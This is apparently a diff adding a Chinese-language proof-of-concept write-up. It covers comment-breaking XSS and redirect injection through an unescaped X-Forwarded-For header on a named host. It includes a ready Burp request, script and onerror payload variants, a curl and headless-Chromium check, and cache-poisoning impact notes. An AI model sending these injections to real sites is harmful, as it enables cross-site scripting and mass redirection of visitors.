@@ -1,0 +1,35 @@
+原理：源站在 HTML 第 0 字节输出一行日志注释，将客户端 IP（取自 X-Forwarded-For）原样写入且不做 HTML 实体转义：
+
+    <!-- {uuid}_{unixts}_{X-Forwarded-For} -page-start -->
+
+注入 `-->` 提前闭合注释后，后续内容进入真实 HTML 上下文，且位置在整篇文档最前（早于 hex2bin 主体与全部同源脚本）。
+
+原始请求（可直接粘进 Burp Repeater）：
+
+    GET / HTTP/1.1
+    Host: h5.nanrb559.cc
+    User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+    X-Forwarded-For: --><script>location.href="https://example.com"</script><!--
+    Connection: close
+
+响应首行：
+
+    <!-- e10bdde7-615e-49be-85fc-5d8d8c9d524d_1793609025_--><script>location.href="https://example.com"</script><!-- -page-start -->
+
+变体（免 script 标签也可用其它标签载荷）：
+
+    X-Forwarded-For: --><img src=x onerror="location='https://example.org'"><!--
+    X-Forwarded-For: --><script>document.location='//example.org'</script><!--
+
+浏览器验证（不需要访问目标，只验证解析行为）：
+
+    curl -x http://127.0.0.1:7892 --http1.1 -H 'X-Forwarded-For: --><script>location.href="https://example.com"</script><!--' \
+         https://h5.nanrb559.cc/ -o inj.html
+    chromium --headless --no-sandbox --virtual-time-budget=6000 --dump-dom file://$PWD/inj.html | head -c 300
+    # 输出为 example.com 的 <title>Example Domain</title>
+
+前置条件与影响面：
+- 需要能控制目标请求的 X-Forwarded-For（代理/自建客户端/中间设备）。浏览器脚本无法设置该头（forbidden header），故不构成"任何访客打开裸域即跳转"。
+- 若目标前方存在共享缓存（CDN Cache-Everything、Varnish、Squid、nginx proxy_cache 且未把 XFF 计入缓存键），该响应被缓存即升级为对全体访客的持久化跳转/XSS。
+- 检测：目标响应首部是否出现 `-page-start -->` 注释；带自定义 XFF 后是否原样回显。
